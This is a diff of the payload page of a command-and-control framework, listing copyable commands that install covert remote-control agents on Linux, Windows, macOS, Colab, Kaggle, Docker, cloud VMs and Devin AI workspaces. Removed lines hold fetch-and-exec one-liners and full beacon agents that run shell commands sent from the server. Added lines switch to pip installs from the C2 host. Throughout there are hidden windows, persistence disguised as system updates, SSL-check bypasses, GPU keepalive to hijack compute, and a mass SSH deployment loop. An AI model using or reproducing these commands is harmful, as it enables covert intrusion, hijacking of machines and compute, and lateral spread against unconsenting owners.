@@ -167,47 +167,25 @@ exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('<span class="srv
 <!-- ═══════════════════════════════════════════════════════ LINUX -->
 <div class="payload-block open">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🐧 Linux Agent (Python)</h3>
+    <h3>🐧 Linux Agent</h3>
     <span class="badge os-linux">Linux / Unix</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Works on any Linux/Unix with Python 3 (stdlib only, no pip needed). Persistent via crontab or systemd.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Universal pip install from C2 server. Works on any Linux/Unix with Python 3.</p>
 
-    <h4 class="section-label">One-Liner (curl):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">…</span>/agents/agent_linux.py -o /tmp/.a.py && python3 /tmp/.a.py &</div>
-
-    <h4 class="section-label">One-Liner (python only, no curl):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
+    <h4 class="section-label">Pip install + run (recommended):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
 
     <h4 class="section-label">Silent background (nohup):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" >/dev/null 2>&1 &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup pip install <span class="srv-url">…</span>/package/c2agent.tar.gz >/dev/null 2>&1 && nohup c2agent >/dev/null 2>&1 &</div>
 
-    <h4 class="section-label">With crontab persistence (auto-restart on reboot):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &
-(crontab -l 2>/dev/null; echo "@reboot python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\" >/dev/null 2>&1 &") | crontab -</div>
+    <h4 class="section-label">With crontab persistence:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && (crontab -l 2>/dev/null; echo "@reboot c2agent >/dev/null 2>&1 &") | crontab - && c2agent &</div>
 
-    <h4 class="section-label">With systemd persistence (service, survives reboot):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' '<span class="srv-url">…</span>/agents/agent_linux.py' -o /opt/.sys-update.py
-cat > /tmp/.svc.service <<'EOF'
-[Unit]
-Description=System Update
-After=network.target
-[Service]
-ExecStart=python3 /opt/.sys-update.py
-Restart=always
-RestartSec=30
-[Install]
-WantedBy=multi-user.target
-EOF
-sudo cp /tmp/.svc.service /etc/systemd/system/sys-update.service 2>/dev/null \
-  && sudo systemctl daemon-reload && sudo systemctl enable --now sys-update \
-  || (mkdir -p ~/.config/systemd/user && cp /tmp/.svc.service ~/.config/systemd/user/ && systemctl --user daemon-reload && systemctl --user enable --now sys-update)
-python3 /opt/.sys-update.py &</div>
-
-    <h4 class="section-label">Mass SSH deploy (targets.txt — one IP per line):</h4>
+    <h4 class="section-label">Mass SSH deploy:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>while read ip; do
   ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@$ip \
-    "nohup python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\" >/dev/null 2>&1 &" &
+    "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && nohup c2agent >/dev/null 2>&1 &" &
 done < targets.txt; wait</div>
   </div>
 </div>
@@ -215,53 +193,43 @@ done < targets.txt; wait</div>
 <!-- ═══════════════════════════════════════════════════════ WINDOWS -->
 <div class="payload-block open">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🪟 Windows Agent (PowerShell)</h3>
+    <h3>🪟 Windows Agent</h3>
     <span class="badge os-windows">Windows</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">PowerShell agent — works on Windows 7+ with .NET 4+. No dependencies required.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Works on Windows with Python 3.</p>
 
-    <h4 class="section-label">PowerShell one-liner (hidden window):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';IEX($w.DownloadString('<span class="srv-url">…</span>/agents/agent_windows.ps1'))"</div>
+    <h4 class="section-label">Pip install + run:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && start /b c2agent</div>
 
-    <h4 class="section-label">Via CMD (start/b — detached process):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>cmd /c "start /b powershell -ep bypass -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX((New-Object Net.WebClient).DownloadString('<span class="srv-url">…</span>/agents/agent_windows.ps1'))\""</div>
+    <h4 class="section-label">PowerShell (hidden):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/package/c2agent.tar.gz'; Start-Process c2agent -WindowStyle Hidden"</div>
 
-    <h4 class="section-label">With Scheduled Task persistence (survives reboot):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$w.DownloadFile('<span class="srv-url">…</span>/agents/agent_windows.ps1','$env:APPDATA\wu.ps1');Register-ScheduledTask -TaskName 'WindowsDefenderUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-ep bypass -w hidden -f $env:APPDATA\wu.ps1') -RunLevel Highest -Force;Start-Sleep 1;Start-Process powershell -ArgumentList '-ep bypass -w hidden -f $env:APPDATA\wu.ps1' -WindowStyle Hidden"</div>
-
-    <h4 class="section-label">Registry Run key persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$w.DownloadFile('<span class="srv-url">…</span>/agents/agent_windows.ps1','$env:APPDATA\wu.ps1');Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value 'powershell -ep bypass -w hidden -f $env:APPDATA\wu.ps1';Start-Process powershell -ArgumentList '-ep bypass -w hidden -f $env:APPDATA\wu.ps1' -WindowStyle Hidden"</div>
-
-    <h4 class="section-label">WMI-based execution (no powershell.exe on PATH):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>wmic process call create "powershell -ep bypass -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('<span class="srv-url">…</span>/agents/agent_windows.ps1'))\"" 2>nul</div>
+    <h4 class="section-label">With Scheduled Task persistence:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/package/c2agent.tar.gz'; Register-ScheduledTask -TaskName 'WindowsUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'c2agent') -RunLevel Highest -Force; Start-Process c2agent -WindowStyle Hidden"</div>
   </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════ MACOS -->
 <div class="payload-block open">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🍎 macOS Agent (Python)</h3>
+    <h3>🍎 macOS Agent</h3>
     <span class="badge os-macos">macOS</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Uses macOS built-in python3. Persistent via LaunchAgents.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Uses macOS built-in python3.</p>
 
-    <h4 class="section-label">One-liner (python):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_macos.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
+    <h4 class="section-label">Pip install + run:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
 
-    <h4 class="section-label">Via curl:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">…</span>/agents/agent_macos.py | python3 &</div>
-
-    <h4 class="section-label">With LaunchAgent persistence (auto-start on login):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' '<span class="srv-url">…</span>/agents/agent_macos.py' -o /tmp/.update.py && python3 /tmp/.update.py &
-mkdir -p ~/Library/LaunchAgents
+    <h4 class="section-label">With LaunchAgent persistence:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz && mkdir -p ~/Library/LaunchAgents
 cat > ~/Library/LaunchAgents/com.apple.system.update.plist <<'EOF'
 <?xml version="1.0"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
 <key>Label</key><string>com.apple.system.update</string>
-<key>ProgramArguments</key><array><string>python3</string><string>/tmp/.update.py</string></array>
+<key>ProgramArguments</key><array><string>c2agent</string></array>
 <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
 </dict></plist>
 EOF
@@ -276,44 +244,17 @@ launchctl load ~/Library/LaunchAgents/com.apple.system.update.plist 2>/dev/null<
     <span class="badge os-colab">Colab / Jupyter</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Runs silently in the background inside a Colab/Jupyter cell. Auto-detects GPU/TPU and reports them.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Runs silently in background.</p>
 
-    <h4 class="section-label">Cell — one-liner (%%capture hides output):</h4>
+    <h4 class="section-label">Cell — pip install:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('<span class="srv-url">…</span>/agents/agent_colab.py').read())</div>
+!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz
+import threading, subprocess
+threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+print("Connected")</div>
 
-    <h4 class="section-label">Cell — full import with status:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import urllib.request as _u
-exec(_u.urlopen(_u.Request('<span class="srv-url">…</span>/agents/agent_colab.py', headers={'User-Agent':'Mozilla/5.0'})).read())</div>
-
-    <h4 class="section-label">Shell cell (! prefix):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_colab.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
-
-    <h4 class="section-label">Inline code (no imports needed, paste in any cell):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import urllib.request as u, threading, os, json, platform, socket, uuid, subprocess, time
-
-C2 = "<span class="srv-url">…</span>"
-AID = str(uuid.uuid4())
-
-def _post(p, d):
-    req = u.Request(f"{C2}{p}", json.dumps(d).encode(), {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
-    return json.loads(u.urlopen(req, timeout=15).read())
-
-def _beacon():
-    while True:
-        try:
-            for t in _post("/api/agent/beacon",{"id":AID}).get("tasks",[]):
-                try:
-                    r = subprocess.check_output(t["payload"],shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace") if t["task_type"]=="cmd" else "ok"
-                    _post("/api/agent/result",{"task_id":t["id"],"result":r[:65000]})
-                except Exception as e:
-                    _post("/api/agent/result",{"task_id":t["id"],"result":str(e)})
-        except: pass
-        time.sleep(5)
-
-_post("/api/agent/register",{"id":AID,"hostname":f"colab-{socket.gethostname()}","username":os.popen("whoami").read().strip(),"os":f"Colab {platform.system()}","arch":platform.machine(),"ip_internal":socket.gethostbyname(socket.gethostname()),"platform_type":"colab"})
-threading.Thread(target=_beacon,daemon=True).start()
-print("Connected:", AID)</div>
+    <h4 class="section-label">Shell cell:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
   </div>
 </div>
 
@@ -324,45 +265,28 @@ print("Connected:", AID)</div>
     <span class="badge os-colab">Kaggle</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Designed for Kaggle kernels. Uses DNS-over-HTTPS to bypass Kaggle's DNS filtering. Supports persistent GPU sessions.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Designed for Kaggle kernels.</p>
 
-    <h4 class="section-label">Notebook cell (recommended):</h4>
+    <h4 class="section-label">Notebook cell:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-import urllib.request as _u, ssl
-ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-from urllib.request import HTTPSHandler, build_opener
-opener = build_opener(HTTPSHandler(context=ctx))
-exec(opener.open(_u.Request('<span class="srv-url">…</span>/agents/kaggle_agent.py', headers={'User-Agent':'Mozilla/5.0'})).read())</div>
+!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz
+import threading, subprocess
+threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()</div>
 
-    <h4 class="section-label">Shell cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!python3 -c "
-import urllib.request as u, ssl
-ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
-from urllib.request import HTTPSHandler,build_opener
-opener=build_opener(HTTPSHandler(context=ctx))
-exec(opener.open(u.Request('<span class="srv-url">…</span>/agents/kaggle_agent.py',headers={'User-Agent':'Mozilla/5.0'})).read())
-" &</div>
-
-    <h4 class="section-label">With GPU session keepalive (prevents Kaggle timeout):</h4>
+    <h4 class="section-label">With GPU keepalive:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-import urllib.request as _u, ssl, threading, time
-ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-from urllib.request import HTTPSHandler, build_opener
-opener = build_opener(HTTPSHandler(context=ctx))
-exec(opener.open(_u.Request('<span class="srv-url">…</span>/agents/kaggle_agent.py', headers={'User-Agent':'Mozilla/5.0'})).read())
-
-# GPU keepalive — prevents idle shutdown
+!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz
+import threading, subprocess, time
+threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
 def _keepalive():
     try:
         import torch
         x = torch.ones(1).cuda()
         while True:
-            _ = x * x  # tiny GPU op every 30s
+            _ = x * x
             time.sleep(30)
-    except Exception:
-        while True: time.sleep(60)
-threading.Thread(target=_keepalive, daemon=True).start()
-print("GPU keepalive active")</div>
+    except: pass
+threading.Thread(target=_keepalive, daemon=True).start()</div>
   </div>
 </div>
 
@@ -373,15 +297,14 @@ print("GPU keepalive active")</div>
     <span class="badge os-docker">Docker</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy agent inside a running Docker container, or spin up a dedicated agent container.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy agent inside Docker container via pip install.</p>
 
-    <h4 class="section-label">Inject into a running container:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker exec -d <CONTAINER_ID> python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"</div>
+    <h4 class="section-label">Inject into running container:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker exec -d <CONTAINER_ID> sh -c "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent"</div>
 
-    <h4 class="section-label">Standalone agent container (always-restart):</h4>
+    <h4 class="section-label">Standalone agent container:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker run -d --name c2-agent --restart=always --network=host \
-  python:3-slim python3 -c \
-  "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"</div>
+  python:3-slim sh -c "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent"</div>
 
     <h4 class="section-label">Docker Compose:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>version: '3.8'
@@ -390,11 +313,8 @@ services:
     image: python:3-slim
     restart: always
     network_mode: host
-    environment:
-      - C2_URL=<span class="srv-url">…</span>
     command: >
-      python3 -c "import urllib.request as u;exec(u.urlopen(u.Request(
-        '${C2_URL}/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"</div>
+      sh -c "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent"</div>
   </div>
 </div>
 
@@ -405,27 +325,27 @@ services:
     <span class="badge type">Cloud</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">User-data / startup scripts for cloud VM instances.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">User-data / startup scripts with pip install.</p>
 
-    <h4 class="section-label">AWS EC2 User Data (bash):</h4>
+    <h4 class="section-label">AWS EC2 User Data:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>#!/bin/bash
-apt-get update -qq && apt-get install -y python3 -qq 2>/dev/null || yum install -y python3 -q 2>/dev/null || true
-curl -sL -H 'User-Agent: Mozilla/5.0' '<span class="srv-url">…</span>/agents/agent_linux.py' -o /opt/.agent.py
-(crontab -l 2>/dev/null; echo "@reboot python3 /opt/.agent.py >/dev/null 2>&1 &") | crontab -
-python3 /opt/.agent.py &</div>
+apt-get update -qq && apt-get install -y python3-pip -qq 2>/dev/null || yum install -y python3-pip -q 2>/dev/null || true
+pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz
+(crontab -l 2>/dev/null; echo "@reboot c2agent >/dev/null 2>&1 &") | crontab -
+c2agent &</div>
 
-    <h4 class="section-label">GCP Startup Script (gcloud CLI):</h4>
+    <h4 class="section-label">GCP Startup Script:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>gcloud compute instances create agent-vm \
   --zone=us-central1-a --machine-type=e2-micro \
   --image-family=debian-11 --image-project=debian-cloud \
   --metadata=startup-script='#!/bin/bash
-curl -sL -H "User-Agent: Mozilla/5.0" "<span class="srv-url">…</span>/agents/agent_linux.py" -o /opt/.agent.py
-python3 /opt/.agent.py &'</div>
+pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz
+c2agent &'</div>
 
-    <h4 class="section-label">Azure — Run Command on existing VM:</h4>
+    <h4 class="section-label">Azure Run Command:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>az vm run-command invoke --resource-group myRG --name myVM \
   --command-id RunShellScript \
-  --scripts "curl -sL -H 'User-Agent: Mozilla/5.0' '<span class="srv-url">…</span>/agents/agent_linux.py' -o /tmp/.agent.py && nohup python3 /tmp/.agent.py >/dev/null 2>&1 &"</div>
+  --scripts "pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz && nohup c2agent >/dev/null 2>&1 &"</div>
   </div>
 </div>
 
@@ -436,37 +356,16 @@ python3 /opt/.agent.py &'</div>
     <span class="badge os-colab">Devin AI</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Agent for Devin AI workspaces. Uses pip install method for stealth.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server for Devin AI workspaces.</p>
 
-    <h4 class="section-label">Direct download from C2 (recommended):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>C2_URL='<span class="srv-url">…</span>' python3 -c "exec(__import__('urllib.request').urlopen(__import__('urllib.request').Request(f'{C2_URL}/agents/universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
+    <h4 class="section-label">Pip install + run:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
 
-    <h4 class="section-label">One-liner (compact):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import os;os.environ['C2_URL']='<span class="srv-url">…</span>';exec(__import__('urllib.request').urlopen(__import__('urllib.request').Request('<span class="srv-url">…</span>/agents/universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
-
-    <h4 class="section-label">Inline execution (no pip, direct):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>C2_URL='<span class="srv-url">…</span>' python3 -c "exec(__import__('urllib.request').urlopen(__import__('urllib.request').Request('<span class="srv-url">…</span>/agents/universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
-
-    <h4 class="section-label">Python cell (for Devin AI code editor):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import os,sys,json,time,socket,platform,subprocess,uuid,threading,ssl
-from urllib.request import Request,urlopen,HTTPSHandler,build_opener
-C2="<span class="srv-url">…</span>"
-AID=str(uuid.uuid4())
-def post(p,d):
-    h={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"}
-    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
-    return json.loads(build_opener(HTTPSHandler(context=ctx)).open(Request(f"{C2}{p}",json.dumps(d).encode(),h),timeout=15).read())
-post("/api/agent/register",{"id":AID,"hostname":socket.gethostname(),"username":subprocess.check_output("whoami",shell=True,timeout=5).decode().strip(),"os":f"{platform.system()} {platform.release()}","arch":platform.machine(),"ip_internal":"127.0.0.1","platform_type":"devin_ai"})
-def beacon():
-    while True:
-        try:
-            for t in post("/api/agent/beacon",{"id":AID}).get("tasks",[]):
-                r=subprocess.check_output(t["payload"],shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace") if t.get("task_type")=="cmd" else "ok"
-                post("/api/agent/result",{"task_id":t["id"],"result":r[:65000]})
-        except:pass
-        time.sleep(10)
-threading.Thread(target=beacon,daemon=True).start()
-print(f"Connected: {AID}")</div>
+    <h4 class="section-label">Python cell:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import subprocess, threading
+subprocess.run(['pip', 'install', '<span class="srv-url">…</span>/package/c2agent.tar.gz'], capture_output=True)
+threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+print("Connected")</div>
   </div>
 </div>
 
